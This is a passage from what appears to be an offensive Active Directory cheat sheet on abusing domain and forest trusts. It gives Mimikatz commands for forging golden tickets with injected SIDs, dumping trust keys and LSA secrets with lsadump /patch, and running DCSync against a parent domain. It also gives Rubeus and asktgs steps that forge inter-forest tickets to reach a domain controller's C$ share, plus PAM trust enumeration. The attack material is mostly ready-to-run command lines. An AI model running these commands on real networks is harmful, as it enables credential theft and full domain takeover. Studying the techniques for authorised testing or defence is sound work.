<div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true" style="display: block; right: 0px; left: 29px;"><div style="height: 100%; min-height: 1px; width: 1303px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 55px; min-width: 1302.62px; padding-right: 0px; padding-bottom: 10px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Invoke-Mimikatz</span> <span class="cm-operator">-</span><span class="cm-identifier">Command</span> <span class="cm-string">'"kerberos::golden /user:dc$ /domain:domain.local /sid:&lt;current_domain_SID&gt; /groups:516 /sids:&lt;parent_domain_SID&gt;-516,S-1-5-9 /krbtgt:&lt;krbtgt_hash&gt; /ptt"'</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Invoke-Mimikatz</span> <span class="cm-operator">-</span><span class="cm-identifier">Command</span> <span class="cm-string">'"lsadump::dcsync /user:parentDomain\Administrator /domain:parentDomain.local"'</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 10px solid transparent; top: 55px;"></div><div class="CodeMirror-gutters" style="height: 105px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<ul id="bkmrk-%3Cparent_domain_sid%3E-"><li>
<code>&lt;parent_domain_SID&gt;-516</code>  Domain Controllers</li>
<li>
<code>S-1-5-9</code>  Enterprise Domain Controllers</li>
</ul><h3 id="bkmrk-across-forest---inbo">Across Forest - Inbound trust</h3>
<h4 id="bkmrk-get-the-trust-key">Get the Trust Key</h4>
<div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true" style="display: block; right: 0px; left: 29px;"><div style="height: 100%; min-height: 1px; width: 369px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 77px; min-width: 368.905px; padding-right: 0px; padding-bottom: 10px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Invoke-Mimikatz</span> <span class="cm-operator">-</span><span class="cm-identifier">Command</span> <span class="cm-string">'"lsadump::trust /patch"'</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">#Or</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">3</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Invoke-Mimikatz</span> <span class="cm-operator">-</span><span class="cm-identifier">Command</span> <span class="cm-string">'"lsadump::lsa /patch"'</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 10px solid transparent; top: 77px;"></div><div class="CodeMirror-gutters" style="height: 127px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<h4 id="bkmrk-get-the-foreignsecur">Get the ForeignSecurityPrincipal</h4>
<p id="bkmrk-when-sid-filtering-i">When SID filtering is enabled on the trust, only these principals can access resources across the trust.</p>
<div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true" style="display: block; right: 0px; left: 29px;"><div style="height: 100%; min-height: 1px; width: 716px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 120px; min-width: 716.333px; padding-right: 0px; padding-bottom: 10px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style=""><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">#These SIDs can access to the target domain</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Get-DomainObject</span> <span class="cm-operator">-</span><span class="cm-identifier">Domain</span> <span class="cm-identifier">targetDomain</span><span class="cm-punctuation">.</span><span class="cm-identifier">local</span> <span class="cm-operator">|</span> <span class="cm-builtin">?</span> <span class="cm-punctuation">{</span><span class="cm-builtin">$_</span><span class="cm-punctuation">.</span><span class="cm-identifier">objectclass</span> <span class="cm-operator">-match</span> <span class="cm-string">"foreignSecurityPrincipal"</span><span class="cm-punctuation">}</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">3</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text=""></span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">4</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">#The found SID can be search in the current forest</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">5</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Get-DomainObject</span> <span class="cm-operator">|</span><span class="cm-builtin">?</span> <span class="cm-punctuation">{</span><span class="cm-builtin">$_</span><span class="cm-punctuation">.</span><span class="cm-identifier">objectSid</span> <span class="cm-operator">-match</span> <span class="cm-string">"&lt;SID&gt;"</span><span class="cm-punctuation">}</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 10px solid transparent; top: 120px;"></div><div class="CodeMirror-gutters" style="height: 170px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<h4 id="bkmrk-forge-the-inter-fore">Forge the inter-forest TGT</h4>
<p id="bkmrk-for-the-domain-admin">For the domain admin (UID 500)</p>
<div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true" style="display: block; right: 0px; left: 29px;"><div style="height: 100%; min-height: 1px; width: 1447px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 34px; min-width: 1447.38px; padding-right: 0px; padding-bottom: 10px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Invoke-Mimikatz</span> <span class="cm-operator">-</span><span class="cm-identifier">Command</span> <span class="cm-string">'"Kerberos::golden /user:Administrator /domain:domain.local /sid:&lt;current_domain_SID&gt; /rc4:&lt;trust_key&gt; /service:krbtgt /target:targetDomain.local /ticket:trust_forest.kirbi"'</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 10px solid transparent; top: 34px;"></div><div class="CodeMirror-gutters" style="height: 84px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<p id="bkmrk-for-a-specific-user-">For a specific user (with the <code>/id</code> parameter)</p>
<div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true" style="display: block; right: 0px; left: 29px;"><div style="height: 100%; min-height: 1px; width: 1505px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 34px; min-width: 1505.29px; padding-right: 0px; padding-bottom: 10px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Invoke-Mimikatz</span> <span class="cm-operator">-</span><span class="cm-identifier">Command</span> <span class="cm-string">'"Kerberos::golden /user:user1 /domain:domain.local /sid:&lt;current_domain_SID&gt; /id:&lt;user1_RID&gt; /rc4:&lt;trust_key&gt; /service:krbtgt /target:targetDomain.local /ticket:trust_forest.kirbi"'</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 10px solid transparent; top: 34px;"></div><div class="CodeMirror-gutters" style="height: 84px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<h4 id="bkmrk-create-a-tgs-with-th-0">Create a TGS with the previous TGT and access service</h4>
<div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true" style="display: block; right: 0px; left: 29px;"><div style="height: 100%; min-height: 1px; width: 825px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 185px; min-width: 824.905px; padding-right: 0px; padding-bottom: 10px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style=""><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">#New tools for more fun</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-punctuation">.\</span><span class="cm-identifier">asktgs</span><span class="cm-punctuation">.</span><span class="cm-identifier">exe</span> <span class="cm-identifier">trust_forest</span><span class="cm-punctuation">.</span><span class="cm-identifier">kirbi</span> <span class="cm-identifier">CIFS</span><span class="cm-operator">/</span><span class="cm-identifier">dc</span><span class="cm-punctuation">.</span><span class="cm-identifier">targetDomain</span><span class="cm-punctuation">.</span><span class="cm-identifier">local</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">3</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-punctuation">.\</span><span class="cm-identifier">kirbikator</span><span class="cm-punctuation">.</span><span class="cm-identifier">exe</span> <span class="cm-identifier">lsa</span> <span class="cm-punctuation">.\</span><span class="cm-identifier">CIFS</span><span class="cm-punctuation">.</span><span class="cm-identifier">dc</span><span class="cm-punctuation">.</span><span class="cm-identifier">targetDomain</span><span class="cm-punctuation">.</span><span class="cm-identifier">local</span><span class="cm-punctuation">.</span><span class="cm-identifier">kirbi</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">4</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-builtin">ls</span> <span class="cm-punctuation">\\</span><span class="cm-identifier">dc</span><span class="cm-punctuation">.</span><span class="cm-identifier">targetDomain</span><span class="cm-punctuation">.</span><span class="cm-identifier">local</span><span class="cm-punctuation">\</span><span class="cm-identifier">C</span><span class="cm-error">$</span><span class="cm-punctuation">\</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">5</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text=""></span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">6</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">#Or classicaly</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">7</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-punctuation">.\</span><span class="cm-identifier">Rubeus</span><span class="cm-punctuation">.</span><span class="cm-identifier">exe</span> <span class="cm-identifier">asktgs</span> <span class="cm-operator">/</span><span class="cm-identifier">ticket</span><span class="cm-operator">:</span><span class="cm-identifier">trust_forest</span><span class="cm-punctuation">.</span><span class="cm-identifier">kirbi</span> <span class="cm-operator">/</span><span class="cm-identifier">service</span><span class="cm-operator">:</span><span class="cm-identifier">cifs</span><span class="cm-operator">/</span><span class="cm-identifier">dc</span><span class="cm-punctuation">.</span><span class="cm-identifier">targetDomain</span><span class="cm-punctuation">.</span><span class="cm-identifier">local</span> <span class="cm-operator">/</span><span class="cm-identifier">dc</span><span class="cm-operator">:</span><span class="cm-identifier">dc</span><span class="cm-punctuation">.</span><span class="cm-identifier">targetDomain</span><span class="cm-punctuation">.</span><span class="cm-identifier">local</span> <span class="cm-operator">/</span><span class="cm-identifier">ptt</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">8</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-builtin">ls</span> <span class="cm-punctuation">\\</span><span class="cm-identifier">dc</span><span class="cm-punctuation">.</span><span class="cm-identifier">targetDomain</span><span class="cm-punctuation">.</span><span class="cm-identifier">local</span><span class="cm-punctuation">\</span><span class="cm-identifier">C</span><span class="cm-error">$</span><span class="cm-punctuation">\</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 10px solid transparent; top: 185px;"></div><div class="CodeMirror-gutters" style="height: 235px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<h3 id="bkmrk-across-forest---pam-">Across Forest - PAM Trust</h3>
<p id="bkmrk-the-goal-is-to-compr">The goal is to compromise the <strong>bastion</strong> forest and pivot to the <strong>production</strong> forest to access to all the resources with a <strong>Shadow Security Principal</strong> mapped to a high priv group.</p>
<h4 id="bkmrk-check-if-the-current">Check if the current forest is a bastion forest</h4>
<ul id="bkmrk-enumerate-trust-prop"><li>Enumerate trust properties</li>
</ul><div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true" style="display: block; right: 0px; left: 29px;"><div style="height: 100%; min-height: 1px; width: 673px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 34px; min-width: 672.905px; padding-right: 0px; padding-bottom: 10px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Get-ADTrust</span> <span class="cm-operator">-</span><span class="cm-keyword">Filter</span> <span class="cm-punctuation">{(</span><span class="cm-identifier">ForestTransitive</span> <span class="cm-operator">-eq</span> <span class="cm-builtin">$True</span><span class="cm-punctuation">)</span> <span class="cm-operator">-and</span> <span class="cm-punctuation">(</span><span class="cm-identifier">SIDFilteringQuarantined</span> <span class="cm-operator">-eq</span> <span class="cm-builtin">$False</span><span class="cm-punctuation">)}</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 10px solid transparent; top: 34px;"></div><div class="CodeMirror-gutters" style="height: 84px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<ul id="bkmrk-enumerate-shadow-sec"><li>Enumerate shadow security principals</li>
</ul><div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true" style="display: block; right: 0px; left: 29px;"><div style="height: 100%; min-height: 1px; width: 1237px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 34px; min-width: 1237.48px; padding-right: 0px; padding-bottom: 10px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Get-ADObject</span> <span class="cm-operator">-</span><span class="cm-identifier">SearchBase</span> <span class="cm-punctuation">(</span><span class="cm-string">"CN=Shadow Principal Configuration,CN=Services,"</span> <span class="cm-operator">+</span> <span class="cm-punctuation">(</span><span class="cm-identifier">Get-ADRootDSE</span><span class="cm-punctuation">).</span><span class="cm-identifier">configurationNamingContext</span><span class="cm-punctuation">)</span> <span class="cm-operator">|</span> <span class="cm-builtin">select</span> <span class="cm-identifier">Name</span><span class="cm-punctuation">,</span><span class="cm-identifier">member</span><span class="cm-punctuation">,</span><span class="cm-identifier">msDS-ShadowPrincipalSid</span> <span class="cm-operator">|</span> <span class="cm-builtin">fl</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 10px solid transparent; top: 34px;"></div><div class="CodeMirror-gutters" style="height: 84px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<ul id="bkmrk-name---name-of-the-s"><li>
<code>Name</code> - Name of the shadow principal</li>
<li>
<code>member</code> - Members from the bastion forest which are mapped to the shadow principal</li>
<li>
<code>msDS-ShadowPrincipalSid</code> - The SID of the principal (user or group) in the user/production forest whose privileges are assgined to the shadow security principal. In our example, it is the Enterpise Admins group in the user forest</li>
</ul><p id="bkmrk-these-users-can-acce">These users can access the production forest through the trust with classic workflow (PSRemoting, RDP, etc), or with <code>SIDHistory</code> injection since <code>SIDFiltering</code> in a <strong>PAM Trust</strong>.</p>
<h4 id="bkmrk-check-if-the-current-0">Check if the current forest is managed by a bastion forest</h4>
